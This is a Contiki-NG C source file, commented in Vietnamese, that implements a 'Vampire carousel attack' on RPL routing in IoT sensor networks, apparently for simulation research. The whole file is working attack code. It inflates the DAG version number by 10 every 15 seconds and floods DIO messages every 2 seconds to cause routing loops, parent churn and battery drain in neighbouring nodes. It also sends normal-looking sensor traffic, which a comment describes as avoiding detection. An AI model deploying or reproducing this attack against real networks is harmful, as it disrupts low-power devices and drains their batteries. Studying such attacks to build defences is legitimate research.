/*
 * VAMPIRE ATTACK: CAROUSEL ATTACK
 * 
 * Mô tả: Attacker liên tục thao túng Version Number và DIO rate
 *        để gây ra routing loops và carousel patterns
 * 
 * Đặc điểm:
 *   - Tăng version number thường xuyên (+10 mỗi 15s)
 *   - Phát DIO với tần suất cao (flooding)
 *   - Gây ra parent switching liên tục ở các node lân cận
 *   - Tạo routing loops khiến gói tin lặp vòng
 * 
 * Impact: Tiêu tốn pin do retransmission, network congestion
 */

#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"   
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "net/netstack.h"
#include "simple-udp.h"
#include "sys/node-id.h"
#include "sys/log.h"
#include "lib/random.h"

#define LOG_MODULE "CAROUSEL"
#define LOG_LEVEL LOG_LEVEL_INFO

#define SEND_PORT 8765

/* Carousel attack parameters */
#define NORMAL_SEND_INTERVAL     (10 * CLOCK_SECOND)  // Normal data sending
#define VERSION_ATTACK_INTERVAL  (15 * CLOCK_SECOND)  // Version manipulation every 15s
#define DIO_FLOOD_INTERVAL       (2 * CLOCK_SECOND)   // High DIO rate (flooding)

typedef struct {
  uint16_t cluster_id;
  uint16_t node_id_f;
  uint32_t seqno;
  uint32_t residual_mj;
  uint32_t tx_time;
  int16_t temperature_c;
} sensor_payload_t;

static struct simple_udp_connection udp_conn;

PROCESS(vampire_carousel_process, "Vampire Carousel Attack");
AUTOSTART_PROCESSES(&vampire_carousel_process);

PROCESS_THREAD(vampire_carousel_process, ev, data)
{
  static struct etimer send_timer;
  static struct etimer version_attack_timer;
  static struct etimer dio_flood_timer;
  static uip_ipaddr_t dest_ipaddr;
  static uint32_t sent_count = 0;
  static uint32_t attack_count = 0;
  
  PROCESS_BEGIN();

  simple_udp_register(&udp_conn, SEND_PORT, NULL, SEND_PORT, NULL);
  
  LOG_INFO("============================================\n");
  LOG_INFO("VAMPIRE ATTACK: CAROUSEL ATTACK ACTIVATED\n");
  LOG_INFO("Attack strategy: Version manipulation + DIO flooding\n");
  LOG_INFO("============================================\n");
  
  etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
  etimer_set(&version_attack_timer, VERSION_ATTACK_INTERVAL);
  etimer_set(&dio_flood_timer, DIO_FLOOD_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT();

    /* VERSION NUMBER MANIPULATION */
    if(ev == PROCESS_EVENT_TIMER && data == &version_attack_timer) {
        if(curr_instance.used) {
            uint8_t old_version = curr_instance.dag.version;
            curr_instance.dag.version += 10;  // Aggressive version increment
            
            LOG_INFO("CAROUSEL_ATTACK version_manipulation: %u -> %u (attack #%lu)\n", 
                     old_version, curr_instance.dag.version, (unsigned long)++attack_count);
            
            rpl_icmp6_dio_output(NULL);
        }
        etimer_set(&version_attack_timer, VERSION_ATTACK_INTERVAL);
    }

    /* DIO FLOODING to create carousel patterns */
    if(ev == PROCESS_EVENT_TIMER && data == &dio_flood_timer) {
        if(curr_instance.used) {
            // Send multiple DIOs in short intervals
            rpl_icmp6_dio_output(NULL);
            
            LOG_DBG("CAROUSEL_ATTACK dio_flood\n");
        }
        etimer_set(&dio_flood_timer, DIO_FLOOD_INTERVAL);
    }

    /* Normal data transmission to avoid detection */
    if(ev == PROCESS_EVENT_TIMER && data == &send_timer) {
      if(NETSTACK_ROUTING.node_is_reachable() &&
         NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        
        sensor_payload_t p;
        p.cluster_id = (node_id <= 26) ? 1 : 2;
        p.node_id_f = node_id;
        p.seqno = sent_count++;
        p.residual_mj = 7200;
        p.tx_time = clock_time();
        p.temperature_c = (int16_t)(250 + (random_rand() % 50));
        
        LOG_DBG("NORMAL_TX node=%u seq=%lu\n", node_id, (unsigned long)p.seqno);
        simple_udp_sendto(&udp_conn, &p, sizeof(p), &dest_ipaddr);
      }
      etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
    }
  }
  PROCESS_END();
}
